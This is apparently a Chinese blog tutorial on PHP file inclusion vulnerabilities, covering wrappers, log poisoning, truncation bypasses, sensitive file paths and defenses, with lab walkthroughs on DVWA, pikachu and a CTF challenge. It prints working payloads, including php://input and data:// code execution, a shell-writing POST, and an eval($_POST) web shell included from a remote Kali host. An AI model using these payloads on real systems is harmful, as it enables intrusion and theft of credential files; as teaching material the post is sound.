# 原创
：  Web漏洞之文件包含漏洞

# Web漏洞之文件包含漏洞

> 
公众号：**黑客菌 **分享更多技术文章，欢迎关注一起探讨学习


### 一、文件包含漏洞概述

#### 1、漏洞介绍

程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，而无需再次编写，这种文件调用的过程一般被称为文件包含。程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变量，用来进行动态调用，但正是由于这种灵活性，从而导致客户端可以调用一个恶意文件，造成文件包含漏洞。

在通过PHP的函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，导致意外的文件泄露甚至恶意的代码注入。

**动态包含**

在使用文件包含的时候，为了更灵活的包含文件，将文件包含的名字处设置为变量，而这个变量是通过GET方式来获取的值，这样既可通过前端所输入的文件名进行包含对应的文件。

#### 2、漏洞产生原因

程序没有对文件的来源进行严格的审查，可以被用户控制，包含其他恶意文件，导致了执行了非预期的代码，也就是程序员在编写代码的时候触犯的逻辑性的错误，就可能会导致文件读取漏洞和其它类型的漏洞

PHP中文件包含函数有以下四种：

> 
require() # require()与include()的区别在于require()执行如果发生错误，函数会输出 错误信息，并终止脚本的运行。
require_once() # 功能与Include()相同，区别在于当重复调用同一文件时，程序只调用一次
include() # 当使用该函数包含文件时，只有代码执行到 include()函数时才将文件包含 进来，发生错误时之给出一个警告，继续向下执行。
include_once() # 功能与require()相同，区别在于当重复调用同一文件时，程序只调用一次。


**包含函数**

PHP常见的导致文件包含的函数如下：**include()，include_once()，require()，require_once()**，fopen()，readfile() 当使用前4个函数包含一个新的文件时，只要文件内容符合PHP语法规范，那么任何扩展名都可以被PHP解析。包含非PHP语法规范源文件时，将会暴露其源代码。

#### 3、漏洞分类及其区别

**远程包含与本地包含**

远程文件包含，需要php.ini开启了allow_url_fopen和allow_url_include的配置。包含的文件是第三方服务器的文件。

本地文件包含的含义就是包含本地服务器的文件

**远程与本地包含的区别**

本地文件包含就是通过浏览器包含web服务器上的文件，这种漏洞是因为浏览器包含文件时没有进行严格的过滤允许遍历目录的字符注入浏览器并执行。

远程文件包含就是允许攻击者包含一个远程的文件,一般是在远程服务器上预先设置好的脚本。此漏洞是因为浏览器对用户的输入没有进行检查，导致不同程度的信息泄露、拒绝服务攻击，甚至在目标服务器上执行代码。

本地文件包含与远程文件有着相同的原理，但前者只能包含服务器上存在的文件，而后者可以包含远程服务器上的文件。

#### 4、文件包含漏洞危害

1、读取web配置文件以及敏感的数据

2、web服务器的文件被外界浏览导致信息泄露;

3、与文件上传漏洞组合getshell，将恶意代码执行解析

一般来说，远程文件包含漏洞危害更大

### 二、文件包含漏洞利用

参考[PHP伪协议总结](https://segmentfault.com/a/1190000018991087)：

#### 1、伪协议利用

> 
<pre>file://
http://
php://</pre>


仅能够对服务器本地的文件进行包含，由于服务器上的文件并不是攻击者所能够控制的，因此该情况下，攻击着更多的会包含一些 固定的系统配置文件，从而读取系统敏感信息。很多时候本地文件包含漏洞会结合一些特殊的文件上传漏洞，从而形成更大的威力。

PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。

1、php://input

说明：用来接收POST数据。我们能够通过input把我们的语句输入上去然后执行。

条件：

php &lt;5.0 ，allow_url_include=Off 情况下也可以用

php &gt; 5.0，只有在allow_url_fopen=On 时才能使用

**例1 ：增加一句话：**

背景：结果将在file.php所在文件下的文件shell.php内增加"&lt;?php phpinfo();?&gt;"一句话。

URL：

> 
<pre>http://localhost/include/file.php?file=php://input</pre>


POST：

> 
<pre>&lt;?php fputs(fopen("shell.php","a"),"&lt;?php phpinfo();?&gt;") ?&gt;</pre>


**例2：增加文件**

背景：通过fopen参数为w，可新建一个文件，并在新建的文件shell.php中写入&lt;?php phpinfo();?&gt;

URL：

> 
<pre>http://localhost/include/file.php?file=php://input</pre>


POST： 

> 
<pre>&lt;?php fputs(fopen("shell.php","w"),"&lt;?php phpinfo();?&gt;") ?&gt;</pre>


**例3：执行系统命令**

背景：通过php的系统执行函数，将执行命令写入到文件中，并且执行系统命令

URL：

> 
<pre>http://localhost/include/file.php?file=php://input </pre>


 POST：

> 
<pre>&lt;?php system('ipconfig');?&gt;
</pre>


2、data://

说明：

这是一种数据流封装器，data:URI schema(URL schema可以是很多形式)

利用data://伪协议进行代码执行的思路原理和php://是类似的，都是利用了PHP中的流的概念，将原本的include的文件流重定向到了用户可控制的输入流中

条件：

> 
<pre>allow_url_include=On
php &gt; 5.2
</pre>


**例1：文字命令**

背景：使用了base64加密的内容

Payload：

> 
<pre>http://localhost/file.php?file=data:text/plain,&lt;?php system(whoami)?&gt;
http://localhost/file.php?file=data:text/plain;base64,PD9waHAgc3lzdGVtKHdob2FtaSk/Pg==</pre>


例2 图片命令：

背景：后面加上图片木马

Payload：

> 
<pre>http://localhost/image.php?imagedata=data://image/jpeg;base64,.....</pre>


 data://手册：[PHP: data:// - Manual](http://www.php.net/manual/zh/wrappers.data.php)

3、php://filter

：这个语句用来查看源码。直接包含php文件时会被解析，不能看到源码，所以用filter来读取，不过要先base64加密传输过来：

Payload：

> 
<pre>http://localhost/file.php?file=php://filter/read=convert.base64-encode/resource=C:\oneword</pre>


（绝对路径）

> 
<pre>http://localhost/file.php?file=php://filter/read=convert.base64-encode/resource=../../oneword</pre>


（相对路径）

> 
<pre>http://localhost/file.php?file=php://filter/read=convert.base64-encode/resource=[http|https|ftp]://www.bbb.com/</pre>


《php:// 》:[PHP: php:// - Manual](http://php.net/manual/zh/wrappers.php.php)手册

**包含日志文件**

说明：比如Web服务器的访问日志文件，这是一种通用的技巧。因为几乎所有网站都会将用户的访问记录到访问日志中。因此，攻击者可以向Web日志中插入PHP代码，通过文件包含漏洞来执行包含在Web日志中的PHP代码。下面的案例中就是利用该技巧成功获取到目标网站的WebShell的。但需要注意的是，如果网站访问量大的话，日志文件可能会非常大，这时如果包含一个这么大的文件时，PHP进程可能会卡死。一般网站通常会每天生成一个新的日志文件，因此在凌晨时进行攻击相对来说容易成功。

**日志默认路径**

apache+Linux日志默认路径

/etc/httpd/logs/access_log/var/log/httpd/access_log

apache+win2003日志默认路径

> 
<pre>D:xamppapachelogsaccess.log
D:xamppapachelogserror.log</pre>


 IIS6.0+win2003默认日志文件

> 
<pre>C:WINDOWSsystem32Logfiles</pre>


IIS7.0+win2003 默认日志文件

> 
<pre>%SystemDrive%inetpublogsLogFiles</pre>


nginx 日志文件在用户安装目录的logs目录下

如安装目录为/usr/local/nginx,则日志目录就是在/usr/local/nginx/logs里

也可通过其配置文件Nginx.conf，获取到日志的存在路径（/opt/nginx/logs/access.log）

**例1 ：包含日志一句话**

背景：日志会记录客户端请求及服务器响应的信息，访问[http://www.xx.com/](http://www.xx.com/)&lt;?php phpinfo(); ?&gt;时，&lt;?php phpinfo(); ?&gt;也会被记录在日志里，也可以插入到User-Agent，但是请求的信息有可能被url编码之后记录日志，这里可以通过burp来发送请求包来防止被编码，通过相对路径找到日志文件，用webshell工具连接即可

Payload：

> 
<pre>http://localhost/include/file.php?file=../../apache/logs/access.log</pre>


 4、file://

用于访问本地文件系统，通常用来**读取本地文件**的且不受`allow_url_fopen`与`allow_url_include`的影响。`include()/require()/include_once()/require_once()`参数可控的情况下，如导入为非`.php`文件，则仍按照php语法进行解析，这是`include()`函数所决定的。

文件的相对路径和文件名

> 
<pre>http://127.0.0.1/include2.php?file=./phpinfo.txt</pre>


file://[文件的绝对路径和文件名]

> 
<pre>http://127.0.0.1/include2.php?file=file://D:\phpStudy\PHPTutorial\WWW\phpinfo.txt</pre>


http：//网络路径和文件名

> 
<pre>http://127.0.0.1/include2.php?file=http://127.0.0.1/phpinfo.txt</pre>


 

实操一题：

某题目

check me 点击后就是这样

不晓得包含的哪些配置文件

`http://4.chinalover.sinaapp.com/web7/index.php?file=php://filter/read=convert.base64-encode/resource=index.php`

读源码，回显的源码经过base64编码，所以要解码后才能读到源码，flag就在里面了

> 
<pre>&lt;html&gt;
&lt;title&gt;asdf&lt;/title&gt;    
&lt;?php
error_reporting(0);
if(!$_GET[file]){echo '&lt;a href="./index.php?file=show.php"&gt;click me? no&lt;/a&gt;';}
$file=$_GET['file'];
if(strstr($file,"../")||stristr($file, "tp")||stristr($file,"input")||stristr($file,"data")){
echo "Oh no!";
exit();
}
include($file); 
//flag:nctf{edulcni_elif_lacol_si_siht}
?&gt;
&lt;/html&gt;</pre>


 

#### 2、文件包含漏洞绕过

**00字符截断(PHP&lt;5.3.4)**

PHP内核是由C语言实现的，因此使用了C语言中的一些字符串处理函数。在连接字符串时，0字节(x00)将作为字符串的结束符。所以在这个地方，攻击者只要在最后加入一个0字节，就能截断file变量之后的字符串。

> 
<pre>../etc/passwd</pre>


通过web输入时，只需UrlEncode，变成:

> 
<pre>../etc/passwd%00</pre>


字符串截断的技巧，也是文件包含中最常用的技巧

**防御方法：**

在一般的web应用中，0字节用户其实是不需要的，因此完全可以禁用0字节

**超长字符截断**

采用00字符过滤并没有完全解决问题，

利用操作系统对目录最大长度的限制，可以不需要0字节而达到截断的目的。

[IBM Developer 正在整合其语言站点组合。 – IBM Developer](http://www.ibm.com/developerworks/cn/java/j-lo-longpath.html)

我们知道目录字符串，在window下256字节、linux下4096字节时会达到最大值，最大值长度之后的字符将被丢弃。

而利用"./"的方式即可构造出超长目录字符串:

除了incldue()等4个函数之外，PHP中能够对文件进行操作的函数都有可能出现漏洞。虽然大多数情况下不能执行PHP代码，但能够读取敏感文件带来的后果也是比较严重的。例如: fopen()、fread()

**任意目录遍历**

除了这种攻击方式，还可以使用"../../../"这样的方式来返回到上层目录中，这种方式又被称为"目录遍历(Path Traversal)"。常见的目录遍历漏洞，还可以通过不同的编码方式来绕过一些服务器端的防御逻辑(WAF)

**防御方法:**

目录遍历漏洞是一种跨越目录读取文件的方法，但当PHP配置了open_basedir时，将很好地保护服务器，使得这种攻击无效。

open_basedir的作用是限制在某个特定目录下PHP能打开的文件(有点像chroot的感觉)

比如在没有设置open_basedir时，文件包含漏洞可以访问任意文件。

当设置了open_basedir时，则包含文件失败。

**问号截断**

如果路径的后半段都定死了，但是结合HTTP传参的原理可以绕过去

攻击者可以构造类似如下的攻击URL：

> 
<pre>http://localhost/FIleInclude/index.php?path=http://localhost/test/solution.php?</pre>


 产生的原理:

> 
<pre>/?path=http://localhost/test/solution.php?</pre>


最终目标应用程序代码实际上执行了:

> 
<pre>require_once "http://localhost/test/solution.php?/action/m_share.php";</pre>


(注意，这里很巧妙，问号"?"后面的代码被解释成URL的querystring，这也是一种"截断"思想，和%00一样)

攻击者可以在[http://localhost/test/solution.php](http://localhost/test/solution.php)上模拟出相应的路径，从而使之吻合

### 三、常见的敏感信息路径

Windows系统

> 
c:\boot.ini // 查看系统版本
c:\windows\system32\inetsrv\MetaBase.xml // IIS配置文件
c:\windows\repair\sam // 存储Windows系统初次安装的密码
c:\ProgramFiles\mysql\my.ini // MySQL配置
c:\ProgramFiles\mysql\data\mysql\user.MYD // MySQL root密码
c:\windows\php.ini // php 配置信息


Linux/Unix系统 

> 
/etc/passwd // 账户信息
/etc/shadow // 账户密码文件
/usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件
/usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置
/usr/local/app/php5/lib/php.ini // PHP相关配置
/etc/httpd/conf/httpd.conf // Apache配置文件
/etc/my.conf // mysql 配置文件


### 四、防御思路

1、无需情况下设置(在php.ini文件中)`allow_url_include`和`allow_url_fopen`为关闭，或者最小权限化

2、对可以包含的文件进行限制，可以使用白名单的方式，或者设置可以包含的目录，如open_basedir

3、尽量不使用动态包含

4、严格检查变量是否已经初始化。

5、严格检查输入的地址，不允许出现目录跳转符。尝试对所有输入提交可能可能包含的文件地址，包括服务器本地文件及远程文件，进行严格的检查，参数中不允许出现../之类的目录跳转符。

6、严格检查include类的文件包含函数中的参数是否外界可控。

7、不要仅仅在客户端做数据的验证与过滤，关键的过滤步骤在服务端进行。

8、在发布应用程序之前测试所有已知的威胁。

三个方面具体解释：

过滤特殊符号

在进行文件包含的时候我们可能经常会用到几个固定的字符，或者我们在用伪协议的时候我们也会使用特定的字符，例如：\，//，input，output，filter等我们可以将这些铭感字符都给过滤掉。代码如下

指定包含的文件 （白名单）

我们在做网站开发的时候我们可能经常会使用我们文件包含的函数，但是我们呢包含的文件都是我们指定的文件，也就是我们知道我们需要包含什么文件。这样，我们在包含文件的时候就可以添加一条规则，让我们只能包含指定的文件，如果我们包含了非指定的文件，程序就会报错退出<img alt="" height="333" src="https://img-blog.csdnimg.cn/1ad56c644e4646e88f6218ead9a190f4.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5riX6YCP5rWL6K-V6ICB6bifLeS5nemdkg==,size_13,color_FFFFFF,t_70,g_se,x_16" width="617"/>

文件目录

php的配置文件中有open_basedir选项可以设置用户需要执行的文件目录，如果设置文件目录的话，我们编写的脚本只会在该目录中搜索文件，这样我们就可以把我们需要包含的文件放到这个目录就可以了，从而也避免了敏感文件的泄露。

## DVWA文件包含漏洞靶场

File Inclusion，意思是文件包含（漏洞），是指当服务器开启alLow_url_include选项时，就可以通过php的某些特性函数（include()，require()和include_once()，require_once()）利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。

### low

源码分析

<img alt="" height="459" src="https://img-blog.csdnimg.cn/5f2e7ac3bcd74e1fabf95a23218cf1cd.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5riX6YCP5rWL6K-V6ICB6bifLeS5nemdkg==,size_20,color_FFFFFF,t_70,g_se,x_16" width="993"/> 点击下面的三个链接，服务器会包含相应的文件，并将结果返回

修改URL:`http://127.0.0.1/dvwa/vulnerabilities/fi/?page=D:\phpstudy\PHPTutorial\WWW\DVWA\php.ini`

我们再尝试一下包含一个phpinfo.txt文件，内容为`&lt;?php phpinfo();?&gt;`需要特别说明的是，服务器包含文件时，不管文件后缀是否是php，都会尝试当做php文件执行，如果文件内容确为php，则会正常执行并返回结果，如果不是，则会原封不动地打印文件内容，所以文件包含漏洞常常会导致任意文件读取与任意命令执行。

Medium 

<img alt="" height="461" src="https://img-blog.csdnimg.cn/09ac233b0a2744e79a466a7b0bf1bf58.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5riX6YCP5rWL6K-V6ICB6bifLeS5nemdkg==,size_20,color_FFFFFF,t_70,g_se,x_16" width="998"/> 

str_replace() //将参数中的http:// https:// ../ ..\都替换成空，很明显可以双写绕过这个

相当于做了一些过滤操作了，禁止目录跳转字符和http/https协议

> 
<pre>http://127.0.0.1/dvwa/vulnerabilities/fi/?page=D:\phpstudy\PHPTutorial\WWW\DVWA\php.ini</pre>
 


那如果我不知道具体目录，肯定不能按照上面这个写法来弄，但可以做双写绕过

`http://127.0.0.1/dvwa/vulnerabilities/fi/?page=hthttp://tp://127.0.0.1/phpinfo.php`

同理，`…/./`，过滤后变成`../`

### High

//文件名必须以file开始，或只能为include.php

file协议

什么是File：File协议主要用于访问本地计算机中的文件，就如同在Windows资源管理器中打开文件一样。

如何使用File：要使用File协议，基本的格式如下：file:///文件路径，比如要打开F盘flash文件夹中的1.swf文件，那么可以在资源管理器或浏览器地址栏中输入：file:///f:/flash/1.swf回车。

High级别的代码规定只能包含file开头的文件，看似安全，不幸的是我们依然可以利用file协议绕过防护策略。file协议其实我们并不陌生，当我们用浏览器打开一个本地文件时，用的就是file协议，构造如下URL

`http://127.0.0.1/DVWA/vulnerabilities/fi/?page=file:///D:\phpstudy\PHPTutorial\WWW\DVWA\php.ini`

 impossbile<img alt="" height="460" src="https://img-blog.csdnimg.cn/bed00f1cf0174ca0b25c03a82a2061d7.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5riX6YCP5rWL6K-V6ICB6bifLeS5nemdkg==,size_20,color_FFFFFF,t_70,g_se,x_16" width="1000"/>

//file变量只能为include.php、file1、file2、file3其中一个

Impossible级别的代码使用了白名单机制进行防护，简单粗暴，page参数必须为“include.php”、“file1.php”、“file2.php”、“file3.php”之一，彻底杜绝了文件包含漏洞。

## pikachu文件包含漏洞靶场

### 本地文件包含

`http://127.0.0.1/pikachu/vul/fileinclude/fi_local.php?filename=file1.php&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2`

修改为：

`http://127.0.0.1/pikachu/vul/fileinclude/fi_local.php?filename=../../../../phpinfo.php&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2`

 

成功包含

### 远程文件包含

先看看url：

`http://127.0.0.1/pikachu/vul/fileinclude/fi_remote.php?filename=include%2Ffile1.php&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2#`

复现步骤：

1：使用kali来做远程主机 2：在kali的`/var/www/html/`目录下新建`phpinfo.txt`

> 
<pre>cd /var/www/html/
vim phpinfo.txt
&lt;?php phpinfo(); ?&gt; &lt;?php @eval($_POST['wx']); ?&gt;
systemctl start apache2.service 
systemctl status apache2.service </pre>


访问kali，没问题 

<img alt="" height="309" src="https://img-blog.csdnimg.cn/7bf340a03c154785919ec64520111369.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5riX6YCP5rWL6K-V6ICB6bifLeS5nemdkg==,size_13,color_FFFFFF,t_70,g_se,x_16" width="636"/> 

`http://127.0.0.1/pikachu/vul/fileinclude/fi_remote.php?filename=http://192.168.142.128/phpinfo.txt&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2#`

OK

 

 

 

 

 

 

 

 

 

 

 

 

 

 

 
